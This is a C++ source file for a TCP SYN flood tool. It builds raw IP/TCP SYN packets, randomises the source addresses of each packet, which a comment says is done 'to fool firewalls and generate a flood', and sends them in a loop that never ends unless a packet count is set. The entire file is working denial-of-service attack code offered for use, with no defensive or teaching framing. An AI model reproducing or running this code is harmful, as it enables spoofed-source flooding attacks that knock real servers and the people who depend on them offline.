#include "syn.h"
#include <net/if.h>
#include <arpa/inet.h>

int check_syn_config(global_config_t &config) {
    if (strlen(config.host) == 0 || config.remote_port == 0) {
        SF_SYSLOG("host or port is not specified.");
        return -1;
    }

    return 0;
}

int init_syn_packet(syn_header_t &syn_header, global_config_t &config) {
    /* Initialize IPv4 Header */
    syn_header.ip_header.version = 4;
    syn_header.ip_header.ihl = 5;
    if (config.tos >= 0 && config.tos <= 7)
        syn_header.ip_header.tos = (config.tos << 5) | 0x10;
    else
        syn_header.ip_header.tos = 0;

    syn_header.ip_header.tot_len = htons(IP_HDRLEN + TCP_HDRLEN);
    /*
     * this field is set outside to avoid duplication of the same 
     * SYN packet
     * => syn_header.ip_header.id = 0;
     */
    syn_header.ip_header.frag_off = htons(0x4000);
    if (config.ttl == 0)
        syn_header.ip_header.ttl = 64;
    else
        syn_header.ip_header.ttl = (uint8_t)config.ttl;
    syn_header.ip_header.protocol = IPPROTO_TCP;

    /*
     * set in the end.
     * => syn_header.ip_header.check = ***
     */
    /*
     * this field is set outside to fool firewalls and generate a flood.
     *
    char source_ip[INET_ADDRSTRLEN];
    if (strlen(config.eth) == 0) { // eth not set, use local ip address 
        if (NULL != get_primary_ip(source_ip, INET_ADDRSTRLEN)) {
            struct in_addr saddr;
            inet_pton(AF_INET, source_ip, &saddr);
            syn_header.ip_header.saddr = saddr.s_addr;
        } else {
            SF_SYSLOG("get_primary_ip() failed.");
            return -1;
        }
    } else { // eth set, use specified eth ip address 
        if (NULL != get_ethernet_ip(config.eth, source_ip, INET_ADDRSTRLEN)) {
            struct in_addr saddr;
            inet_pton(AF_INET, source_ip, &saddr);
            syn_header.ip_header.saddr = saddr.s_addr;
        } else {
            SF_SYSLOG("get_ethernet_ip() failed.");
            return -1;
        }
    } */

    char dest_ip[INET_ADDRSTRLEN];
    in_addr daddr;
    if (is_valid_ip(config.host)) {
        strcpy(dest_ip, config.host);
    } else {
        vector<string> ips;
        if (-1 != resolve_fqdn_to_ip(config.host, ips)) {
            strcpy(dest_ip, ips[0].c_str());
        } else {
            SF_SYSLOG("resolve dns failed for %s", config.host);
            return -1;
        }
    }
    inet_pton(AF_INET, dest_ip, &daddr);
    syn_header.ip_header.daddr = daddr.s_addr;

    /* Initialize TCP Header */
    if (config.local_port == 0)
        config.local_port = 9765;
    syn_header.tcp_header.th_sport = htons((uint16_t)config.local_port);
    syn_header.tcp_header.th_dport = htons((uint16_t)config.remote_port);
    /* 
     * this field is set outside to avoid TCP packet duplication
     * => syn_header.tcp_header.th_seq = ***
     */
    syn_header.tcp_header.th_ack = htonl(0);
    syn_header.tcp_header.th_x2 = 0;
    syn_header.tcp_header.th_off = 5;
    syn_header.tcp_header.th_flags = TH_SYN;
    syn_header.tcp_header.th_win = htons(65535);
    /*
     * this field is set outside.
     * => syn_header.tcp_header.th_sum
     */
    syn_header.tcp_header.th_urp = htons(0);

    return 0;
}

// Computing the internet checksum (RFC 1071).
uint16_t checksum (uint16_t *addr, int len) {
    int count = len;
    register uint32_t sum = 0;
    uint16_t answer = 0;

    // Sum up 2-byte values until none or only one byte left.
    while (count > 1) {
    sum += *(addr++);
    count -= 2;
    }

    // Add left-over byte, if any.
    if (count > 0) {
    sum += *(uint8_t *) addr;
    }

    // Fold 32-bit sum into 16 bits; we lose information by doing this,
    // increasing the chances of a collision.
    // sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)
    while (sum >> 16) {
    sum = (sum & 0xffff) + (sum >> 16);
    }

    // Checksum is one's compliment of sum.
    answer = ~sum;

    return (answer);
}

// Build IPv4 TCP pseudo-header and call checksum function.
uint16_t tcp4_checksum (struct iphdr &iphdr, struct tcphdr &tcphdr) {
    uint16_t svalue;
    char buf[IP_MAXPACKET], cvalue;
    char *ptr;
    int chksumlen = 0;

    // ptr points to beginning of buffer buf
    ptr = &buf[0];

    // Copy source IP address into buf (32 bits)
    memcpy (ptr, &iphdr.saddr, sizeof (iphdr.saddr));
    ptr += sizeof (iphdr.saddr);
    chksumlen += sizeof (iphdr.saddr);

    // Copy destination IP address into buf (32 bits)
    memcpy (ptr, &iphdr.daddr, sizeof (iphdr.daddr));
    ptr += sizeof (iphdr.daddr);
    chksumlen += sizeof (iphdr.daddr);

    // Copy zero field to buf (8 bits)
    *ptr = 0; ptr++;
    chksumlen += 1;

    // Copy transport layer protocol to buf (8 bits)
    memcpy (ptr, &iphdr.protocol, sizeof (iphdr.protocol));
    ptr += sizeof (iphdr.protocol);
    chksumlen += sizeof (iphdr.protocol);

    // Copy TCP length to buf (16 bits)
    svalue = htons (sizeof (tcphdr));
    memcpy (ptr, &svalue, sizeof (svalue));
    ptr += sizeof (svalue);
    chksumlen += sizeof (svalue);

    // Copy TCP source port to buf (16 bits)
    memcpy (ptr, &tcphdr.th_sport, sizeof (tcphdr.th_sport));
    ptr += sizeof (tcphdr.th_sport);
    chksumlen += sizeof (tcphdr.th_sport);

    // Copy TCP destination port to buf (16 bits)
    memcpy (ptr, &tcphdr.th_dport, sizeof (tcphdr.th_dport));
    ptr += sizeof (tcphdr.th_dport);
    chksumlen += sizeof (tcphdr.th_dport);

    // Copy sequence number to buf (32 bits)
    memcpy (ptr, &tcphdr.th_seq, sizeof (tcphdr.th_seq));
    ptr += sizeof (tcphdr.th_seq);
    chksumlen += sizeof (tcphdr.th_seq);

    // Copy acknowledgement number to buf (32 bits)
    memcpy (ptr, &tcphdr.th_ack, sizeof (tcphdr.th_ack));
    ptr += sizeof (tcphdr.th_ack);
    chksumlen += sizeof (tcphdr.th_ack);

    // Copy data offset to buf (4 bits) and
    // copy reserved bits to buf (4 bits)
    cvalue = (tcphdr.th_off << 4) + tcphdr.th_x2;
    memcpy (ptr, &cvalue, sizeof (cvalue));
    ptr += sizeof (cvalue);
    chksumlen += sizeof (cvalue);

    // Copy TCP flags to buf (8 bits)
    memcpy (ptr, &tcphdr.th_flags, sizeof (tcphdr.th_flags));
    ptr += sizeof (tcphdr.th_flags);
    chksumlen += sizeof (tcphdr.th_flags);

    // Copy TCP window size to buf (16 bits)
    memcpy (ptr, &tcphdr.th_win, sizeof (tcphdr.th_win));
    ptr += sizeof (tcphdr.th_win);
    chksumlen += sizeof (tcphdr.th_win);

    // Copy TCP checksum to buf (16 bits)
    // Zero, since we don't know it yet
    *ptr = 0; ptr++;
    *ptr = 0; ptr++;
    chksumlen += 2;

    // Copy urgent pointer to buf (16 bits)
    memcpy (ptr, &tcphdr.th_urp, sizeof (tcphdr.th_urp));
    ptr += sizeof (tcphdr.th_urp);
    chksumlen += sizeof (tcphdr.th_urp);

    return checksum ((uint16_t *) buf, chksumlen);
}

int send_syn_packet(int syn_socket, syn_header_t &syn_header) {
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = syn_header.ip_header.daddr;
    target.sin_port = syn_header.tcp_header.th_dport;

    int rc = sendto(syn_socket, &syn_header, sizeof(syn_header_t), 0, (struct sockaddr *)&target, sizeof(target));
    if (rc < 0) {
        SF_SYSLOG("sendto(%d) failed. (%s)", syn_socket, strerror(errno));
        return -1;
    }

    return 0;
}

int syn_flood() {
    int rc = check_syn_config(g_config);
    if (rc < 0) {
        SF_SYSLOG("check syn config failed.");
        return -1;
    }

    syn_header_t syn_header;
    rc = init_syn_packet(syn_header, g_config);
    if (rc < 0) {
        SF_SYSLOG("init syn packet failed.");
        return -1;
    }

    int on = 1;
    int syn_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (syn_socket < 0) {
        SF_SYSLOG("create syn_socket failed. (%s)", strerror(errno));
        return -1;
    } else {
        SF_SYSLOG("create raw socket (%d)", syn_socket);
    }

    rc = setsockopt(syn_socket, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    if (rc == -1) {
        SF_SYSLOG("setsockopt(%d) failed. (%s)", syn_socket, strerror(errno));
        return -1;
    }

    char ip[INET_ADDRSTRLEN];
    char eth[IF_NAMESIZE];
    if (strlen(g_config.eth) == 0) {
        get_primary_ip(ip, INET_ADDRSTRLEN);
        get_ethname_by_ip(ip, eth, IF_NAMESIZE);
    } else
        strcpy(eth, g_config.eth);

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", eth);
    rc = setsockopt(syn_socket, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr));
    if (rc < 0) {
        SF_SYSLOG("setsockopt(%d) failed. (%s)", syn_socket, strerror(errno));
        return -1;
    }

    uint16_t ip_packet_id = 0; /* unique id of IP packet, increase by 1 */
    uint32_t tcp_syn_seq = 0; /* unique sequence number of TCP SYN packet, increase by 1 */
    int packets = 0; /* continue flooding */
    if (g_config.packets > 0)
        packets = g_config.packets;
    struct in_addr saddr;
    char src_ip[INET_ADDRSTRLEN];
    for (int i = 0; packets == 0 || i < packets; ++i) {
        srandom(i);
        sprintf(src_ip, "%d.%d.%d.%d", random() % 255, random() % 255, random() % 255, random() % 255);
        inet_pton(AF_INET, src_ip, &saddr);
        syn_header.ip_header.saddr = saddr.s_addr;
        syn_header.ip_header.id = htons(ip_packet_id + i);
        syn_header.ip_header.check = 0;
        syn_header.ip_header.check = checksum((uint16_t *)&syn_header.ip_header, sizeof(syn_header.ip_header));
        syn_header.tcp_header.th_seq = htonl(tcp_syn_seq + i);
        syn_header.tcp_header.th_sum = 0;
        syn_header.tcp_header.th_sum = tcp4_checksum(syn_header.ip_header, syn_header.tcp_header);

        rc = send_syn_packet(syn_socket, syn_header);
        if (rc < 0) {
            SF_SYSLOG("send syn packet failed.");
            continue;
        }
    }

    return 0;
}
